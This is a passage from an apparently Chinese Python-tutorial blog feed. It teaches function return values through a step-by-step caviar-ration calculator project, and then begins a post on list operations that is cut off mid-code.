title="2.函数的返回值"></a>2.函数的返回值</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">wage</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> month <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">5000</span> <span class="token operator">*</span> month    <span class="token keyword">else</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">6000</span> <span class="token operator">*</span> month    <span class="token keyword">return</span> money month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'你工作了多少个月:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>money <span class="token operator">=</span> wage<span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"你的工资为</span><span class="token interpolation"><span class="token punctuation">{</span>money<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数也可以返回多个值，但需要注意，不要依次写多个return，因为遇到第一个return，函数就结束了，后面的程序不会执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">wage</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    bonus <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> month    <span class="token keyword">if</span> month <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">5000</span> <span class="token operator">*</span> month    <span class="token keyword">else</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">6000</span> <span class="token operator">*</span> month    <span class="token keyword">return</span> money<span class="token punctuation">,</span>bonusmonth <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'你工作了多少个月:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>money <span class="token operator">=</span> wage<span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h1><h2 id="一、任务需求"><a href="#一、任务需求" class="headerlink" title="一、任务需求"></a>一、任务需求</h2><p>假设你是联合国主席兼世界首富，想要捐助你的母校海盐商贸学校若干箱鱼子酱，以改善同学们的伙食，但是买得少了不够吃，买得太多吃不完，过了保质期会造成浪费，所以需要一个程序来计算数量，计算方式有两种。</p><ul><li>已知每位同学每月能够吃10箱鱼子酱。</li><li>计算方式1：时间计算<br>🐱‍👤例如输入10000箱鱼子酱、共有100位同学，程序帮我们计算出鱼子酱可以供同学们食用10个月。</li><li>计算方式2：人力计算<br>🐱‍👤例如输入10000箱鱼子酱，但是保质期只有两个月了，程序帮我们计算出至少需要找500位同学才能按时吃完。<h2 id="二、初始版本"><a href="#二、初始版本" class="headerlink" title="二、初始版本"></a>二、初始版本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 已知每位同学每个月能吃完10箱鱼子酱</span><span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span><span class="token keyword">def</span> <span class="token function">JiSuan_month</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span><span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span><span class="token keyword">def</span> <span class="token function">JiSuan_student_num</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    student_num <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>JiSuan_month<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>               <span class="token comment">#调用时间计算函数</span>JiSuan_student_num<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>           <span class="token comment">#调用人力计算函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、修复BUG"><a href="#三、修复BUG" class="headerlink" title="三、修复BUG"></a>三、修复BUG</h2>在使用一段时间之后，我们发现了一个bug，举例来说，当采购了10000箱鱼子酱，保质期为三个月，程序计算出需要至少找333.3个同学来吃才能够按时吃完，我们没有办法去找0.3位同学，所以这个时候可以向上取整。<br>向上取整我们可以使用math.ceil()函数，使用之前记得import。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token comment">#时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span><span class="token keyword">def</span> <span class="token function">JiSuan_month</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span><span class="token comment">#人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span><span class="token keyword">def</span> <span class="token function">JiSuan_student_num</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>JiSuan_month<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>               <span class="token comment">#调用时间计算函数</span>JiSuan_student_num<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>           <span class="token comment">#调用人力计算函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、合并函数"><a href="#四、合并函数" class="headerlink" title="四、合并函数"></a>四、合并函数</h2><p>现在程序已经没有BUG了，但是需要分别调用两个函数，比较麻烦，我们能不能想办法把两个函数合并为一个函数呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、增进体验"><a href="#五、增进体验" class="headerlink" title="五、增进体验"></a>五、增进体验</h2><p>虽然现在函数的调用变简单了，但是对于用户来说还是太难了，因为这个程序只能是程序员会用，只有程序员才知道函数括号里的参数应该怎么填，应该怎么改。如果我们现在要交付给用户使用，应该如何改进呢？🤷‍♂️</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入计算的类型（1、时间计算 2、人力计算）:'</span><span class="token punctuation">)</span>    yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入学生的数量:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        JiSuan<span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span>student_num<span class="token punctuation">)</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入鱼子酱的保质期（月）：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        JiSuan<span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token operator">=</span>month<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新输入'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、结构化设计"><a href="#六、结构化设计" class="headerlink" title="六、结构化设计"></a>六、结构化设计</h2><p>现在用户的确可以使用了，但是对于程序员来说，又不符合程序设计的结构性原则，不仅自己很难维护，别人也很难阅读，我们需要按照逻辑的划分对代码进行封装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span><span class="token comment">#获取用户输入</span><span class="token keyword">def</span> <span class="token function">UserInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入计算的类型（1、时间计算 2、人力计算）:'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            student_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入学生的数量:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            month <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">break</span>        <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入鱼子酱的保质期（月）：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            student_num <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新输入'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">,</span>month<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> UserInput<span class="token punctuation">(</span><span class="token punctuation">)</span>    yzj_num <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    student_num <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    month <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    JiSuan<span class="token punctuation">(</span>yzj_num<span class="token operator">=</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span>student_num<span class="token punctuation">,</span>month<span class="token operator">=</span>month<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大功告成😁😍😁，是不是一个看似很简单的程序，但是程序设计的流程其实是很严谨的，我希望我们可以通过一个简单的程序，去体会程序开发的思想。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法2—剪刀石头布</title>
      <link href="/2022/02/16/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%952%E2%80%94%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83/"/>
      <url>/2022/02/16/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%952%E2%80%94%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h2 id="一、列表的使用"><a href="#一、列表的使用" class="headerlink" title="一、列表的使用"></a>一、列表的使用</h2><h3 id="1-从列表中提取单个元素"><a href="#1-从列表中提取单个元素" class="headerlink" title="1.从列表中提取单个元素"></a>1.从列表中提取单个元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-从列表中提取多个元素"><a href="#2-从列表中提取多个元素" class="headerlink" title="2.从列表中提取多个元素"></a>2.从列表中提取多个元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：列表切片遵循原则：“左包右不包”。</p><h3 id="3-增加元素"><a href="#3-增加元素" class="headerlink" title="3.增加元素"></a>3.增加元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-删除元素"><a href="#4-删除元素" class="headerlink" title="4.删除元素"></a>4.删除元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-改变列表中的元素"><a href="#5-改变列表中的元素" class="headerlink" title="5.改变列表中的元素"></a>5.改变列表中的元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'小明'</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6-查找列表中的元素"><a href="#6-查找列表中的元素" class="headerlink" title="6.查找列表中的元素"></a>6.查找列表中的元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token string">'小孩'</span><span class="token punctuation">]</span><span class="token 